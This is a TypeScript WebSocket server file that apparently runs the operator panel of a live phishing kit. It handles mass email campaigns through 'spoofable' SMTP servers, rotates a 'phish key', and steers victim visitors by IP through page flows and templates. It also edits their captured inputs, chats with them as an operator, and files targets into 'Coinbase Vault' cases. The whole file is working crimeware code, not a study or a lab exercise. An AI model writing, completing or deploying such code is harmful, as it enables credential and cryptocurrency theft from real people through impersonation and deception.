import { WebSocketServer, type WebSocket } from 'ws';
import type { Server } from 'http';
import { serverState, type ClientEvent, type ServerEvent } from './state.js';
import { startSimulator } from './simulator.js';
import { addSmtpConfig, removeSmtpConfig, sendCampaign } from './mailer.js';
import {
	dbGetConversationByIp,
	dbUpsertConversation,
	dbInsertMessage,
	dbMarkMessagesRead,
	dbUpsertVaultCase,
	dbUpdateVaultCase,
	dbDeleteVaultCase,
	dbGetVaultCases
} from './database.js';

let wss: WebSocketServer | null = null;
const clients: Set<WebSocket> = new Set();
let simulatorStarted = false;

export function broadcast(event: ServerEvent): void {
	const message = JSON.stringify(event);
	for (const client of clients) {
		if (client.readyState === 1) {
			client.send(message);
		}
	}
}

export function broadcastStats(): void {
	broadcast({ type: 'stats:updated', payload: serverState.getStats() });
}

function handleClientMessage(data: string): void {
	let event: ClientEvent;
	try {
		event = JSON.parse(data);
	} catch {
		return;
	}

	switch (event.type) {
		case 'visitor:push': {
			const { ip, targetFlow } = event.payload;
			const visitor = serverState.pushVisitor(ip, targetFlow);
			if (visitor) {
				const logEntry = serverState.addLogEntry(
					`admin pushed visitor to ${targetFlow}`,
					'action'
				);
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'log:new', payload: logEntry });
				broadcastStats();
			}
			break;
		}
		case 'settings:update': {
			serverState.updateHost(event.payload);
			const logEntry = serverState.addLogEntry(
				`admin updated settings for host ${event.payload.domain}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			broadcast({
				type: 'init',
				payload: serverState.getInitPayload()
			});
			break;
		}
		case 'flow:create': {
			serverState.addFlow(event.payload);
			broadcast({ type: 'flows:updated', payload: serverState.flows });
			break;
		}
		case 'flow:update': {
			serverState.updateFlow(event.payload);
			broadcast({ type: 'flows:updated', payload: serverState.flows });
			break;
		}
		case 'flow:delete': {
			serverState.deleteFlow(event.payload.id);
			broadcast({ type: 'flows:updated', payload: serverState.flows });
			break;
		}
		case 'mailer:send': {
			const { recipients, templateId, subject, senderEmail, senderName, smtpId, html: emailHtml } = event.payload;
			const html = emailHtml || '';
			const logEntry = serverState.addLogEntry(
				`admin sending campaign to ${recipients.length} recipients (template ${templateId})`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });

			if (!smtpId) {
				broadcast({ type: 'mailer:result', payload: { sent: 0, failed: recipients.length, total: recipients.length, errors: ['No SMTP server selected'] } });
				break;
			}

			sendCampaign({
				smtpId,
				recipients,
				subject: subject || 'No Subject',
				html,
				fromEmail: senderEmail,
				fromName: senderName
			}).then((results) => {
				const sent = results.filter(r => r.success).length;
				const failed = results.filter(r => !r.success).length;
				const errors = results.filter(r => !r.success).map(r => `${r.recipient}: ${r.error}`);

				const resultLog = serverState.addLogEntry(
					`Campaign complete: ${sent}/${results.length} sent successfully`,
					sent === results.length ? 'action' : 'alert'
				);
				broadcast({ type: 'log:new', payload: resultLog });
				broadcast({ type: 'mailer:result', payload: { sent, failed, total: results.length, errors } });
			});
			break;
		}
		case 'mailer:smtp:add': {
			const id = event.payload.id || String(Date.now());
			addSmtpConfig({
				id,
				host: event.payload.host,
				port: event.payload.port,
				user: event.payload.user,
				password: event.payload.password,
				useSSL: event.payload.useSSL ?? false,
				spoofable: event.payload.spoofable ?? false
			});
			const logEntry = serverState.addLogEntry(
				`admin added SMTP server ${event.payload.host}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'mailer:smtp:remove': {
			removeSmtpConfig(event.payload.id);
			const logEntry = serverState.addLogEntry(
				`admin removed SMTP server`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'users:create': {
			const user = serverState.addUser(event.payload.username, event.payload.role as 'admin' | 'user');
			broadcast({ type: 'users:updated', payload: serverState.users });
			const logEntry = serverState.addLogEntry(
				`admin created user ${user.username}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'users:delete': {
			serverState.deleteUser(event.payload.id);
			broadcast({ type: 'users:updated', payload: serverState.users });
			const logEntry = serverState.addLogEntry(
				`admin deleted a user account`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'users:list': {
			broadcast({ type: 'users:updated', payload: serverState.users });
			break;
		}
		case 'stats:request': {
			broadcastStats();
			break;
		}
		case 'domains:add': {
			const domain = serverState.addDomain(event.payload.domain);
			broadcast({ type: 'domains:updated', payload: serverState.domains });
			const logEntry = serverState.addLogEntry(
				`admin added domain ${domain.domain}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'domains:delete': {
			serverState.deleteDomain(event.payload.id);
			broadcast({ type: 'domains:updated', payload: serverState.domains });
			const logEntry = serverState.addLogEntry(
				`admin removed a domain`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'inbox:add': {
			const account = serverState.addInboxAccount(event.payload.email);
			broadcast({ type: 'inbox:updated', payload: serverState.inboxAccounts });
			const logEntry = serverState.addLogEntry(
				`admin added inbox account ${account.email}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'inbox:remove': {
			serverState.removeInboxAccount(event.payload.id);
			broadcast({ type: 'inbox:updated', payload: serverState.inboxAccounts });
			break;
		}
		case 'inbox:refresh': {
			broadcast({ type: 'inbox:updated', payload: serverState.inboxAccounts });
			break;
		}
		case 'settings:server': {
			serverState.serverSettings = event.payload;
			const logEntry = serverState.addLogEntry(
				`admin updated server settings`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'settings:client': {
			serverState.clientSettings = event.payload;
			break;
		}
		case 'profile:update': {
			const logEntry = serverState.addLogEntry(
				`admin updated their password`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'profile:rotate-key': {
			const logEntry = serverState.addLogEntry(
				`admin rotated phish key`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'visitor:redirect': {
			const { ip, template } = event.payload;
			const visitor = serverState.setVisitorLastPage(ip, template);
			if (visitor) {
				const logEntry = serverState.addLogEntry(
					`admin redirected ${ip} to ${template}`,
					'action'
				);
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'log:new', payload: logEntry });
			}
			break;
		}
		case 'visitor:bypass-flow': {
			const { ip, bypassed } = event.payload;
			const visitor = serverState.setVisitorBypass(ip, bypassed);
			if (visitor) {
				const logEntry = serverState.addLogEntry(
					`admin ${bypassed ? 'bypassed' : 'resumed'} flow for ${ip}`,
					'action'
				);
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'log:new', payload: logEntry });
			}
			break;
		}
		case 'visitor:set-last-two': {
			const { ip, digits } = event.payload;
			const cleaned = (digits || '').replace(/\D/g, '').slice(-2);
			const visitor = serverState.setVisitorLastTwo(ip, cleaned);
			if (visitor) {
				const logEntry = serverState.addLogEntry(
					`admin set last 2 digits for ${ip}: ${cleaned || '—'}`,
					'action'
				);
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'log:new', payload: logEntry });
			}
			break;
		}
		case 'visitor:promote-vault': {
			const { ip } = event.payload;
			const visitor = serverState.visitors.get(ip);
			if (visitor) {
				visitor.module = 'Coinbase Vault';
				dbUpsertVaultCase({
					visitorIp: ip,
					module: visitor.module,
					location: [visitor.city, visitor.region].filter(Boolean).join(', '),
					capturedBy: visitor.capturedBy
				});
				const logEntry = serverState.addLogEntry(`admin promoted ${ip} to Vault`, 'action');
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'vault:updated', payload: { ip } });
				broadcast({ type: 'log:new', payload: logEntry });
			}
			break;
		}
		case 'livechat:operator:send': {
			const { ip, body } = event.payload;
			if (!ip || !body || !body.trim()) break;
			const visitor = serverState.visitors.get(ip);
			let conv = dbGetConversationByIp(ip);
			if (!conv) conv = dbUpsertConversation(ip, visitor?.module || '');
			const msg = dbInsertMessage({
				conversationId: conv.id,
				sender: 'operator',
				authorName: 'admin',
				body: body.trim(),
				seen: true,
				createdAt: Date.now()
			});
			broadcast({
				type: 'livechat:msg:new',
				payload: { conversationId: conv.id, visitorIp: ip, message: msg }
			});
			break;
		}
		case 'livechat:operator:read': {
			const { ip } = event.payload;
			const conv = dbGetConversationByIp(ip);
			if (conv) {
				dbMarkMessagesRead(conv.id);
				broadcast({ type: 'livechat:msg:read', payload: { conversationId: conv.id, visitorIp: ip } });
			}
			break;
		}
		case 'vault:update': {
			const { id, ...patch } = event.payload;
			dbUpdateVaultCase(id, patch);
			broadcast({ type: 'vault:updated', payload: { id } });
			break;
		}
		case 'vault:delete': {
			dbDeleteVaultCase(event.payload.id);
			broadcast({ type: 'vault:updated', payload: { deleted: event.payload.id } });
			break;
		}
		case 'visitor:livechat-open': {
			break;
		}
		case 'visitor:export': {
			const { ip } = event.payload;
			const logEntry = serverState.addLogEntry(`admin exported visitor ${ip}`, 'action');
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'visitor:setinputs': {
			const { ip, inputs } = event.payload;
			const visitor = serverState.visitors.get(ip);
			if (visitor) {
				Object.assign(visitor.inputs, inputs);
				broadcast({ type: 'visitor:updated', payload: visitor });
			}
			break;
		}
		case 'visitor:screen': {
			const visitor = serverState.visitors.get(event.payload.ip);
			if (visitor) {
				broadcast({ type: 'visitor:screen:data', payload: { ip: event.payload.ip, src: '' } });
			}
			break;
		}
		case 'visitor:delete': {
			const { ip } = event.payload;
			serverState.deleteVisitor(ip);
			const logEntry = serverState.addLogEntry(`admin deleted visitor ${ip}`, 'action');
			broadcast({ type: 'visitor:disconnected', payload: { ip } });
			broadcast({ type: 'log:new', payload: logEntry });
			broadcastStats();
			break;
		}
		case 'visitors:delete': {
			serverState.deleteAllVisitors();
			const logEntry = serverState.addLogEntry('admin deleted all visitors', 'action');
			broadcast({ type: 'init', payload: serverState.getInitPayload() });
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'flow:clear': {
			const visitor = serverState.visitors.get(event.payload.ip);
			if (visitor) {
				visitor.flowSteps = [];
				visitor.flow = '';
				broadcast({ type: 'visitor:updated', payload: visitor });
			}
			break;
		}
		case 'flow:reorder': {
			const visitor = serverState.visitors.get(event.payload.ip);
			if (visitor) {
				visitor.flowSteps = event.payload.order;
				broadcast({ type: 'visitor:updated', payload: visitor });
			}
			break;
		}
		case 'chat:send': {
			const msg = {
				id: String(Date.now()),
				user: 'admin',
				message: event.payload.text,
				time: new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true }),
				timestamp: Date.now()
			};
			serverState.chatMessages.push(msg);
			if (serverState.chatMessages.length > 200) serverState.chatMessages.shift();
			broadcast({ type: 'chat:new', payload: msg });
			break;
		}
		case 'chat:list': {
			broadcast({ type: 'chat:list', payload: serverState.chatMessages });
			break;
		}
		case 'chat:delete': {
			serverState.chatMessages = [];
			broadcast({ type: 'chat:list', payload: [] });
			break;
		}
		case 'admin:link': {
			const domain = serverState.hosts.length > 0 ? serverState.hosts[0].domain : 'localhost';
			broadcast({ type: 'admin:link', payload: { on: true, domain, auth: serverState.adminLinkAuth } });
			break;
		}
	}
}

export function setupWebSocket(server: Server): WebSocketServer {
	if (wss) return wss;

	wss = new WebSocketServer({ server, path: '/ws' });

	wss.on('connection', (socket: WebSocket) => {
		clients.add(socket);

		const initPayload = serverState.getInitPayload();
		socket.send(JSON.stringify({ type: 'init', payload: initPayload }));

		const logEntry = serverState.addLogEntry('Client admin signed in', 'connect');
		broadcast({ type: 'log:new', payload: logEntry });
		broadcastStats();

		socket.on('message', (raw) => {
			handleClientMessage(raw.toString());
		});

		socket.on('close', () => {
			clients.delete(socket);
		});
	});

	const demoMode = process.env.DEMO_MODE === 'true';
	if (!simulatorStarted && demoMode) {
		simulatorStarted = true;
		startSimulator();
		console.log('[ws] Simulator started (DEMO_MODE=true)');
	} else if (!demoMode) {
		console.log('[ws] Real API mode (no simulator). Send data via POST /api/* endpoints.');
	}

	return wss;
}
